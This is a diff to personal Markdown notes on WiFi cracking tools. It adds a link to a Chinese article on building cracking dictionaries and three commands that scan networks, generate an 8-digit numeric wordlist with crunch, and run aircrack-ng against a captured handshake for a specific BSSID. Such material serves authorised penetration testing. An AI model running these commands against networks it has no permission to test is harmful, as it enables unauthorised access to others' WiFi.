@@ -7,6 +7,8 @@ tags:
 description: 
 ---
 
+关于破解的方法和思路参考[渗透测试之构建高效WiFi破解字典](https://www.anquanke.com/post/id/219315)
+
 常见工具：  
 
 - [bully](https://www.kali.org/tools/bully/)
@@ -28,6 +30,14 @@ brew install autoconf automake libtool openssl shtool pkg-config hwloc pcre sqli
  gmake
  gmake install
  ldconfig
+```
+
+
+```
+airport -s
+crunch 8 8 0123456789 -o dic.txt
+aircrack-ng -w dic.txt -M 100 -f 80 -1 -a 2 -b a8:02:db:3c:b4:cb airportSniff*.cap
+
 ```
 
 
